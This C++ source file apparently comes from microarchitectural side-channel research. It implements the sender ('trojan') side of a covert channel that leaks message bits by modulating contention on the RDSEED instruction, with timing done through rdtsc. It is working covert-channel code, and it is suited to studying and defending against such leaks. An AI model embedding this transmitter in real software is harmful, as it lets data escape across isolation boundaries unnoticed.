#include "libdd_trojan.hpp"

#define INIT_CONTENTION 100000L
#define PRE_SENDING_CONT 10
#define MAX_LEN 32 // Max length of message that can be sent
#define HALF_PERIOD 680000L
#define RDSEED_SPAM 8

unsigned long long t;
unsigned long long imp_t[10];

inline int rdseed(uint64_t *seed) {
    unsigned char ok;
	asm volatile ("rdseed %0; setc %1": "=r" (*seed), "=qm" (ok));
	return (int)ok;
}

inline void hi() {
    uint64_t u64;
    unsigned long long init = __rdtsc();
    while (__rdtsc() - init < HALF_PERIOD) {
        for (int i = 0; i < RDSEED_SPAM; i++) {
            rdseed(&u64);
        }
    }
}

inline void lo() {
    unsigned long long init = __rdtsc();
    while (__rdtsc() - init < HALF_PERIOD) {
        // spin 
    }
}

// Initialize communication by creating contention
void init_channel() {
    uint64_t u64;
    unsigned long long init = __rdtsc();
    t = init;
    while (__rdtsc() - init < INIT_CONTENTION) {
        for (int i = 0; i < RDSEED_SPAM; i++) {
            rdseed(&u64);
        }
    }
}

// Callback for send
int dd_send(const uint8_t* packet, size_t size) {

    bool* data = (bool*) malloc(size * sizeof(bool));
    bool bit;
    bool temp;
    int idx = 0;
    if (size == CHUNK_LEN + CHUNK_ID_LEN) {
        for (int i = 0; i < 16; i++) {
            if (i > 1 && i < 8) continue;
            bit = (packet[i / 8] >> (i % 8)) & 1;
            data[idx] = bit;
            idx++;
        }
        temp = data[0];
        data[0] = data[1];
        data[1] = temp;
        imp_t[2] = __rdtsc();
    } else {
        data[0] = 1;
        for (int i = 0; i < size-1; i++) {
            bit = (packet[i / 8] >> (i % 8)) & 1;
            data[i+1] = bit;
        }
        imp_t[1] = __rdtsc();
    }

    
    
    // before you start sending a packet, enable a state of 
    // very very high contention
    for (int i = 0; i < PRE_SENDING_CONT; i++) {
        hi();
    }

    // start sending the data
    for (int i = 0; i < size; i++) {
        if(data[i]) {
            hi();
            lo();
        } else {
            lo();
            hi();
        }
    }
    
    // for (int i = 0; i < size; i++) {
    //     printf("data[%d]: %d\n", i, data[i]);
    // }

    free(data);
    data = NULL;

    return EXIT_SUCCESS;
}


// Callback for recv
int dd_recv(uint8_t* packet, size_t *size, bool fitf) {
    return EXIT_SUCCESS;
}

int main() {

    trojan_sess_t sess;
    char input[MAX_LEN];

    // printf("Please type a message\n");
    init_trojan(&sess, &dd_recv, &dd_send);

    while (true) {
        fgets(input, MAX_LEN, stdin);
        init_channel();
        imp_t[0] = __rdtsc();
        send_msg(&sess, input);
        printf("time when low starts: %llu\n", imp_t[0]);
        printf("time when lo ends: %llu\n", imp_t[1]);
    }

    return EXIT_SUCCESS;
}